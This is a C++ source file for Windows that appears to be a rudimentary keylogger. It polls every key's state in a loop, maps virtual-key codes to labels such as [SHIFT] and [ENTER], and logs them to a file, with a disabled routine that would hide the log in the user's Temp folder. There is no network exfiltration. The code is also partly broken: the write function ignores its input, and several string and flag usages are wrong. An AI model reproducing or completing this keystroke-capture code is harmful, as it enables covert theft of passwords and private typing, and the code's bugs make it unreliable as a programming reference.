#include "stdafx.h"
#include <windows.h>
#include <cstdlib>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

//		G L O B A L S
short wasAltPressed;
wchar_t		fileName[256];
HANDLE		hFile = INVALID_HANDLE_VALUE;
DWORD		dwBytesWritten;

short determineKey(int sScannedKey);

void WriteToFile(char *wText)
{
    hFile = CreateFile((LPTSTR) fileName,
                           GENERIC_WRITE,        // open for write 
                           0,                    // do not share 
                           NULL,                 // default security 
                           OPEN_ALWAYS | CREATE_ALWAYS,        // overwrite existing
                           FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH,// normal file 
                           NULL);                // no template 
	std::cout << (char *)wText << std::endl;
    WriteFile(hFile, L"asd", 4, &dwBytesWritten, NULL);
    CloseHandle(hFile);
}
//*********************************************************
DWORD FetchKeyCode( )
{
    DWORD i     = 0x00;
    DWORD ret   = 0x00;
    do{
        if( GetAsyncKeyState(i)&0x1 )
            ret = i;
        i++;
    }while( !ret && i < 0xFF );

    return ret;
}
//*********************************************************
char VKtoCHAR(int vk)
{
    static UCHAR keyboardState[256];
    USHORT asciiVal;
    static HKL layout = GetKeyboardLayout(0);     // get layout
    if( GetKeyboardState(keyboardState) == false )// get keyboard state (shift etc)
        return 0;
    if( ToAsciiEx( vk, MapVirtualKey(vk,0), keyboardState, &asciiVal, 0, layout ) == 0 )//  ASCII
        return 0;
    return static_cast<char>(asciiVal);
}
//*********************************************************
int determineOS() 
{
	//on what OS we r ?
    DWORD   version = GetVersion();
    DWORD   major   = (DWORD)(LOBYTE(LOWORD(version)));
    DWORD   minor   = (DWORD)(HIBYTE(LOWORD(version)));
	size_t sz = 0;

    if ((major > 6) || ((major == 6) && (minor >= 1))) 
    {
        //OS is win7 or later
        char * myhome;
		if (_dupenv_s(&myhome, &sz, "USERPROFILE") == 0)
		{
			swprintf(fileName, L"%s%s", myhome, "\\AppData\\Local\\Temp\\wut");
			free(myhome);
			return 1;
		}
    } else if ((major > 5) || ((major == 5) && (minor >= 1))) 
    {
        //OS is xp or later
		char * myhome;
        if (_dupenv_s(&myhome, &sz, "USERPROFILE") == 0)
		{
			_swprintf(fileName, L"%s%s", myhome, "\\Local Settings\\Temp\\wut");
			free(myhome);
			return 1;
		}
    }

	return 0;
}
//-------------------------------------------------------
int main(int argc, char *argv[])
{
	/*if (!determineOS())
	{
		std::cout << "can't determine OS";
		return -1337;
	}*/

	swprintf(fileName, L"wut");

	while(1)
	{
		DWORD key = FetchKeyCode();
		if (key >= 8 && key <= 222)
		{
			determineKey(key);
		}
		
	}
	return 0;
}
//----------------------------------------------------
short determineKey(int sScannedKey)
{
	if (wasAltPressed && ((sScannedKey == 65 || sScannedKey == 97)))
	{
		std::cout << "¹";
		wasAltPressed = false;
		//break;
	}

	std::cout << (char)sScannedKey;
	//WriteToFile((char *)sScannedKey);

	switch(sScannedKey) 
	{
		//http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
		//case VK_RMENU:
		case VK_RMENU:
		wasAltPressed = true;
		WriteToFile("[ALT]");
		break;
		case VK_SPACE:
		WriteToFile(" ");
		break;
		case VK_SHIFT:
		WriteToFile("[SHIFT]");
		break;
		case VK_RETURN:
		WriteToFile("[ENTER]");
		break;
		case VK_BACK:
		WriteToFile("[BACKSPACE]");
		break;
		case VK_TAB:
		WriteToFile("[TAB]");
		break;
		case VK_CONTROL:
		WriteToFile("[CTRL]");
		break;
		case VK_DELETE:
		WriteToFile("[DEL]");
		break;
		case VK_OEM_1:
		WriteToFile("[;:]");
		break;
		case VK_OEM_2:
		WriteToFile("[/?]");
		break;
		case VK_OEM_3:
		WriteToFile("[`~]");
		break;
		case VK_OEM_4:
		WriteToFile("[ [{ ]");
		break;
		case VK_OEM_5:
		WriteToFile("[\\|]");
		break;
		case VK_OEM_6:
		WriteToFile("[ ]} ]");
		break;
		case VK_OEM_7:
		WriteToFile("['\"]");
		break;
		case VK_OEM_PLUS:
		WriteToFile("+");
		break;
		case VK_OEM_COMMA:
		WriteToFile(",");
		break;
		case VK_OEM_MINUS:
		WriteToFile("-");
		break;
		case VK_OEM_PERIOD:
		WriteToFile(".");
		break;
		case VK_NUMPAD0:
		WriteToFile("0");
		break;
		case VK_NUMPAD1:
		WriteToFile("1");
		break;
		case VK_NUMPAD2:
		WriteToFile("2");
		break;
		case VK_NUMPAD3:
		WriteToFile("3");
		break;
		case VK_NUMPAD4:
		WriteToFile("4");
		break;
		case VK_NUMPAD5:
		WriteToFile("5");
		break;
		case VK_NUMPAD6:
		WriteToFile("6");
		break;
		case VK_NUMPAD7:
		WriteToFile("7");
		break;
		case VK_NUMPAD8:
		WriteToFile("8");
		break;
		case VK_NUMPAD9:
		WriteToFile("9");
		break;
		case VK_CAPITAL:
		WriteToFile("[CAPS LOCK]");
		break;
		case VK_PRIOR:
		WriteToFile("[PAGE UP]");
		break;
		case VK_NEXT:
		WriteToFile("[PAGE DOWN]");
		break;
		case VK_END:
		WriteToFile("[END]");
		break;
		case VK_HOME:
		WriteToFile("[HOME]");
		break;
		case VK_LWIN:
		case VK_RWIN:
		WriteToFile("[WIN]");
		break;
		default:
		break;
	}        
	return 0;
}